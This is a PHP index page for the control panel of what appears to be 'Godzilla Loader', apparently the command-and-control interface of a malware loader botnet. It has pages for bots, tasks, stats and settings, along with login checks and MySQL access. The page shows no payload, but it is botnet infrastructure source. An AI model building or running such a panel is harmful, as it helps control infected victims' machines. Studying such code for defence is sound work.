<?php 
session_start();
@set_time_limit(0);
@ini_set('max_execution_time', 0);
header('Content-Type: text/html; charset=utf-8');
ob_start();
$start_time = microtime(true);
error_reporting(E_ALL);

define('CP', TRUE);

if(!is_readable(__DIR__.'/core/config.php')){
	header('Location: install.php');
}else
{
	if(is_readable(__DIR__.'/install.php'))
		die("<b>install.php already exists delete it first!</b>");
}


require __DIR__.'/core/config.php';  
require __DIR__.'/core/geoip/geoipcity.php';

if(!empty($_GET['cp']))
	$page = $_GET['cp'];
else 
	$page = 'stats';


$database = @new mysqli($MYSQL_HOST, $MYSQL_LOGIN, $MYSQL_PASSWORD, $MYSQL_DB);
if (mysqli_connect_error()) {
	define('MYSQL_ERROR', TRUE);
    require 'templates/settings.php';
}

@mysqli_query($database, 'SET NAMES "utf8" COLLATE "utf8_unicode_ci";');


include __DIR__.'/core/common.php';

if (USER_LOGGED) {
	    if(!check_user($database, $UserID))
			logout();
} else {
	require 'templates/login.php';
	check_login($database);
	die();
}

?>
<!DOCTYPE html>
<html>
	<head>
		<title>Godzilla &#9679; <?php if(!empty($page))echo $lang[$syslang][$page] ?></title>
		<style>
		@import url(media/css/vendor.min.css);
		@import url(media/css/dashboard<?php echo $_SESSION['theme'] == "2" ? ".night" : ".day" ?>.css);
		</style>
		<script type=text/javascript src=media/js/vendor.min.js></script>
		<script type=text/javascript src=media/js/dashboard.js></script>
	</head>
<body class=bg-info>
	<nav class="navbar navbar-default navbar-static-top">
		<div class=container-fluid>
			<div class=navbar-collapse>
				<ul class="nav navbar-nav">
					<li class=<?php if(!$page || $page == 'stats')echo 'active';?>>
						<a href="?cp=stats"><i class="fa fa-pie-chart"></i> <?php echo $lang[$syslang]['stats'] ?></a>
					</li>
					<li class=<?php if(!$page || $page == 'bots')echo 'active';?>>
						<a href="?cp=bots"><i class="fa  fa-users"></i> <?php echo $lang[$syslang]['bots'] ?></a>
					</li>
					<li class=<?php if(!$page || $page == 'tasks')echo 'active';?>>
						<a href="?cp=tasks"><i class="fa fa-tasks"></i> <?php echo $lang[$syslang]['tasks'] ?></a>
					</li>
					<li class=<?php if(!$page || $page == 'settings')echo 'active';?>>
						<a href="?cp=settings"><i class="fa fa-cog"></i> <?php echo $lang[$syslang]['settings'] ?></a>
					</li>
				</ul>
				<ul class="nav navbar-nav navbar-right">
					<li class=dropdown>
						<a href=# class=dropdown-toggle data-toggle=dropdown><span class=caret></span> <?php echo $syslang == 'en' ? "English" : "Русский"?> </a>
						<ul class=dropdown-menu>
							<li><a href=<?php BuildLangURL("en")?>><i class=f-US></i> English</a></li>
							<li><a href=<?php BuildLangURL("ru")?>><i class=f-RU></i> Русский</a></li>
						</ul>
					</li>
					<li><a href=?logout><i class="fa fa-sign-out"></i> <?php echo $lang[$syslang]['logout'] ?></a></li>
				</ul>
			</div>
		</div>
	</nav>
	<div class=container>
		<div class="panel panel-default" id=main>
			<div class=panel-body style=height:80vh>
 <?php
 
	switch($page)
	{
		case 'tasks':
			require 'templates/tasks.php';
			Tasks($database);
			break;
		case 'stats':
			require 'templates/stats.php';
			break;
		case 'bots':
			require 'templates/bots.php';
			break;
		case 'settings':
			require 'templates/settings.php';
			break;				
		default:
			require 'templates/stats.php';
			break;			
	}
 @mysqli_close($database);
 ?>
			</div>
				<div class="panel-footer text-right"> 
					&copy; Godzilla Loader <span class="small text-muted">ver. 1.6</span>
				</div>
		</div>
	</div>
</body>
</html>
<?php ob_end_flush();?>